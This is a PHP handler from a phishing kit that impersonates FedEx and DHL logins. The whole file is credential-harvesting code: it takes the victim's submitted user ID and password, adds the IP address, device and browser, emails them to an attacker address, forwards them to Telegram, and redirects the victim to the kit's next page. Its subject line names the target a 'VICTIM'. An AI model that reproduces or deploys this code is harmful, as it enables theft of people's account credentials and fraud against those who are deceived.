<?php
include("../../system/os.php");
include("../../system/tlgrm.php");
include "../ur_email.php";
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeanlog'] != "") AND ($_POST['jeanpass'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "+]###############[+]fedex petter LOGIN [+]###############[+\n";
$message .= "# USER ID/EMAIL : ".$_POST['jeanlog']."\n";
$message .= "# PASSWORD      : ".$_POST['jeanpass']."\n";
$message .= "# IP INFO       : $ip\n";
$message .= "# TIME/DATE     : $date\n";
$message .= "# DEVICE        : $user_os\n";
$message .= "# BROWSER       : $user_browser\n";
$message .= "+]###############[+] J E A N [+]###############[+\n";
$send = "$jean_email";
$subject = "📦 NEW DHL VICTIM LOGIN INFO FROM = $ip";
$headers = "From: petter";
mail($send,$subject,$message,$headers);
telegram($message);
echo "<meta http-equiv='refresh' content='0; url=../../address.php'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; ../../address.php' />";
}

?>